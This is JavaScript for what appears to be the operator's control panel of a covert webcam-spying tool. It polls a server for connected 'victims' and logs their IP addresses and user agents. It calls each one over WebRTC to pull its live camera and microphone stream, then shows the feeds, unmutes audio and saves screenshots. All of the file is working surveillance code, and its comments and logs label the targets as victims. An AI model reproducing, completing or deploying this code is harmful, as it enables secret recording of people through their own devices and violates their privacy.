
    var controlPeer = null;
    var activeCalls = {};
    var knownPeers = {};
    var snapCount = 0;

    // Create a unique control panel peer ID
    var ctrlId = 'ctrl-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 4);

    function log(msg, type) {
      var el = document.createElement('div');
      el.className = 'log ' + (type || 'info');
      el.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
      document.getElementById('logs').prepend(el);
      // Keep max 100 logs
      var logs = document.getElementById('logs');
      while (logs.children.length > 100) {
        logs.removeChild(logs.lastChild);
      }
    }

    // Create a dummy silent/black stream to initiate calls
    // (PeerJS call() requires a MediaStream even if we only want to receive)
    function createDummyStream() {
      var canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      var ctx = canvas.getContext('2d');
      ctx.fillStyle = '#000';
      ctx.fillRect(0, 0, 640, 480);
      var stream = canvas.captureStream(0);
      return stream;
    }

    var dummyStream = createDummyStream();

    // Initialize control panel PeerJS connection
    function initControlPeer() {
      controlPeer = new Peer(ctrlId, {
        config: {
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' },
            { urls: 'stun:stun2.l.google.com:19302' },
            { urls: 'stun:stun3.l.google.com:19302' }
          ]
        }
      });

      controlPeer.on('open', function() {
        log('Control panel connected to PeerJS cloud (ID: ' + ctrlId.substring(0, 15) + '...)', 'success');
        fetchPeers();
      });

      controlPeer.on('error', function(err) {
        log('PeerJS error: ' + err.type + ' - ' + err.message, 'error');
      });

      controlPeer.on('disconnected', function() {
        log('PeerJS disconnected, reconnecting...', 'error');
        setTimeout(function() {
          if (controlPeer && !controlPeer.destroyed) {
            controlPeer.reconnect();
          }
        }, 3000);
      });
    }

    // Call a victim peer to get their camera stream
    function callVictim(peerId) {
      if (activeCalls[peerId]) return;
      if (!controlPeer || controlPeer.disconnected) {
        log('Control peer not ready, skipping call to ' + peerId, 'error');
        return;
      }

      log('Calling victim: ' + peerId + '...', 'info');

      try {
        var call = controlPeer.call(peerId, dummyStream);
        if (!call) {
          log('Call returned null for ' + peerId, 'error');
          return;
        }

        activeCalls[peerId] = call;

        call.on('stream', function(remoteStream) {
          log('🎥 Stream received from ' + peerId, 'success');
          var vid = document.getElementById('vid-' + peerId);
          if (vid) {
            vid.srcObject = remoteStream;
            vid.play().catch(function() {});
            // Update status badge
            var badge = document.getElementById('badge-' + peerId);
            if (badge) badge.textContent = '● LIVE';
          }
        });

        call.on('close', function() {
          log('Call closed: ' + peerId, 'info');
          delete activeCalls[peerId];
          var badge = document.getElementById('badge-' + peerId);
          if (badge) {
            badge.textContent = '● DISCONNECTED';
            badge.style.color = '#ff6b6b';
          }
        });

        call.on('error', function(err) {
          log('Call error for ' + peerId + ': ' + err, 'error');
          delete activeCalls[peerId];
        });
      } catch (e) {
        log('Exception calling ' + peerId + ': ' + e.message, 'error');
      }
    }

    function addCard(peerId, ua, ip) {
      var list = document.getElementById('list');
      var noSession = list.querySelector('.no-sessions');
      if (noSession) noSession.remove();

      if (document.getElementById('card-' + peerId)) return;

      var card = document.createElement('div');
      card.className = 'session-card';
      card.id = 'card-' + peerId;

      var shortUa = (ua || 'Unknown').substring(0, 70);
      var displayIp = ip || 'N/A';

      card.innerHTML = '<h3>📱 ' + peerId + '</h3>'
        + '<div class="info">IP: <span>' + displayIp + '</span> | UA: ' + shortUa + '</div>'
        + '<div class="video-container">'
        + '  <video id="vid-' + peerId + '" autoplay playsinline muted></video>'
        + '  <div class="status-badge" id="badge-' + peerId + '">● CONNECTING</div>'
        + '</div>'
        + '<div class="controls">'
        + '  <button class="btn-audio muted" id="audiobtn-' + peerId + '" onclick="toggleAudio(\'' + peerId + '\')">🔇 Muted</button>'
        + '  <button class="btn-snap" onclick="takeSnap(\'' + peerId + '\')">📸 Screenshot</button>'
        + '</div>';

      list.appendChild(card);
      updateCount();

      // Call this victim after a short delay
      setTimeout(function() {
        callVictim(peerId);
      }, 800);
    }

    function removeCard(peerId) {
      var card = document.getElementById('card-' + peerId);
      if (card) card.remove();

      if (activeCalls[peerId]) {
        try { activeCalls[peerId].close(); } catch(e) {}
        delete activeCalls[peerId];
      }
      delete knownPeers[peerId];
      updateCount();
    }

    function updateCount() {
      var list = document.getElementById('list');
      var count = list.querySelectorAll('.session-card').length;
      document.getElementById('count').textContent = count;
      if (count === 0) {
        list.innerHTML = '<div class="no-sessions"><span class="icon">🔴</span>Waiting for victims to connect...</div>';
      }
    }

    function toggleAudio(peerId) {
      var vid = document.getElementById('vid-' + peerId);
      var btn = document.getElementById('audiobtn-' + peerId);
      if (vid) {
        vid.muted = !vid.muted;
        if (vid.muted) {
          btn.textContent = '🔇 Muted';
          btn.className = 'btn-audio muted';
        } else {
          btn.textContent = '🔊 Audio ON';
          btn.className = 'btn-audio';
        }
      }
    }

    function takeSnap(peerId) {
      var vid = document.getElementById('vid-' + peerId);
      if (!vid || !vid.srcObject) { alert('Video not ready yet'); return; }
      var canvas = document.createElement('canvas');
      canvas.width = vid.videoWidth || 640;
      canvas.height = vid.videoHeight || 480;
      canvas.getContext('2d').drawImage(vid, 0, 0);
      var link = document.createElement('a');
      link.download = 'snap_' + peerId.substring(0, 10) + '_' + Date.now() + '.png';
      link.href = canvas.toDataURL('image/png');
      link.click();
      snapCount++;
      document.getElementById('snaps').textContent = snapCount;
      log('📸 Screenshot saved for ' + peerId, 'success');
    }

    // Fetch active peers from server REST API
    function fetchPeers() {
      fetch('/api/sessions')
        .then(function(res) { return res.json(); })
        .then(function(peers) {
          // Track current peer IDs from server
          var currentIds = {};
          peers.forEach(function(p) {
            currentIds[p.peerId] = true;

            if (!knownPeers[p.peerId]) {
              knownPeers[p.peerId] = true;
              log('New victim detected: ' + p.peerId, 'success');
              addCard(p.peerId, p.ua, p.ip);
            }
          });

          // Remove peers that are no longer active
          var toRemove = [];
          for (var id in knownPeers) {
            if (!currentIds[id]) {
              toRemove.push(id);
            }
          }
          toRemove.forEach(function(id) {
            log('Victim disconnected: ' + id, 'error');
            removeCard(id);
          });
        })
        .catch(function(e) {
          log('API fetch error: ' + e.message, 'error');
        });
    }

    // Start everything
    initControlPeer();

    // Poll for new victims every 5 seconds
    setInterval(fetchPeers, 5000);
  